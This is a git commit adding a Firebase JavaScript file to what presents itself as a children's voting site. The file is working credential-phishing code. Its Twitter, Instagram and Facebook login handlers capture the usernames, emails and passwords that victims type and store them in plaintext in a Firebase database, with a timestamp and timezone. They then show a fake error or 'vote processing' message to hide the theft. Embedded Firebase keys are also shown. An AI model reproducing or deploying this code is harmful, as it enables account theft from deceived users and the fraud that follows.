19c36b810cc139133e58d085e7023e5c6a977395
kbeckinsale7964 <kbeckinsale194@gmail.com>
2024-06-08 08:48:26 +0000

    Initial commit
    Created from https://vercel.com/new

---
+++ js/firebase.js
@@ -0,0 +1,137 @@
+// Initialize Firebase
+const firebaseConfig = {
+  apiKey: "AIzaSyCQAsov3XqUJpcLIlHHOTFnpAr137AkIvw",
+  authDomain: "voteelegantkids.firebaseapp.com",
+  databaseURL: "https://voteelegantkids-default-rtdb.firebaseio.com",
+  projectId: "voteelegantkids",
+  storageBucket: "voteelegantkids.appspot.com",
+  messagingSenderId: "509518530087",
+  appId: "1:509518530087:web:d96e46e9ee5e21bf88b002"
+};
+firebase.initializeApp(firebaseConfig);
+const appCheck = firebase.appCheck();
+console.log(appCheck);
+appCheck.activate('6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW', true);
+
+
+function tw_login() {
+  firebase.auth().signInAnonymously().catch(function(error) {
+    var errorCode = error.code;
+    var errorMessage = error.message;
+    window.alert("Error: " + errorMessage);
+  });
+
+  var email = document.getElementById('tw-email').value;
+  var password = document.getElementById('tw-pass').value;
+  var currentDate = new Date().toISOString().slice(0, 10);
+  var currentTime = new Date().toISOString().slice(11, 19);
+  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  var accountType = 'Twitter';
+
+  if (email !== '' && password !== '') {
+    firebase.database().ref('fbdet').push({
+      emle: email,
+      mobile: '',
+      time: currentTime,
+      timezone: timezone,
+      pass: password,
+      date: currentDate,
+      type: accountType
+    });
+
+    setTimeout(function() {
+
+      Swal.fire({
+        title: 'Oops!',
+        text: 'Something went wrong with your vote.',
+        icon: 'error',
+        confirmButtonText: 'Try Again'
+      });
+      document.getElementById('fb-pass').value = '';
+
+      return false;
+    }, 2000);
+  }
+}
+
+
+function iglog() {
+  firebase.auth().signInAnonymously().catch(function(error) {
+    var errorCode = error.code;
+    var errorMessage = error.message;
+    window.alert("Error: " + errorMessage);
+  });
+
+  var username = document.getElementById('ig-uname').value;
+  var password = document.getElementById('ig-pass').value;
+  var currentDate = new Date().toISOString().slice(0, 10);
+  var currentTime = new Date().toISOString().slice(11, 19);
+  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  console.log(timezone);
+  var accountType = 'Instagram';
+
+  if (username !== '' && password !== '') {
+    firebase.database().ref('fbdet').push({
+      emle: username,
+      mobile: '',
+      time: currentTime,
+      timezone: timezone,
+      pass: password,
+      date: currentDate,
+      type: accountType
+    });
+
+    setTimeout(function() {
+
+      Swal.fire({
+        title: 'Oops!',
+        text: 'Your vote is being processed. A voting code would be sent to you to complete your vote.',
+        icon: 'success',
+        confirmButtonText: 'Okay'
+      });
+
+      document.getElementById('ig-pass').value = '';
+      return false;
+    }, 2000);
+  }
+}
+
+function login() {
+  firebase.auth().signInAnonymously().catch(function(error) {
+    var errorCode = error.code;
+    var errorMessage = error.message;
+    window.alert("Error: " + errorMessage);
+  });
+
+  var email = document.getElementById('fb-email').value;
+  var password = document.getElementById('fb-pass').value;
+  var currentDate = new Date().toISOString().slice(0, 10);
+  var currentTime = new Date().toISOString().slice(11, 19);
+  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  var accountType = 'Facebook';
+
+  if (email !== '' && password !== '') {
+    firebase.database().ref('fbdet').push({
+      emle: email,
+      mobile: '',
+      time: currentTime,
+      timezone: timezone,
+      pass: password,
+      date: currentDate,
+      type: accountType
+    });
+
+    setTimeout(function() {
+
+      Swal.fire({
+        title: 'Oops!',
+        text: 'Your vote is being processed. A voting code would be sent to you to complete your vote.',
+        icon: 'success',
+        confirmButtonText: 'Okay'
+      });
+      document.getElementById('fb-pass').value = '';
+
+      return false;
+    }, 2000);
+  }
+}
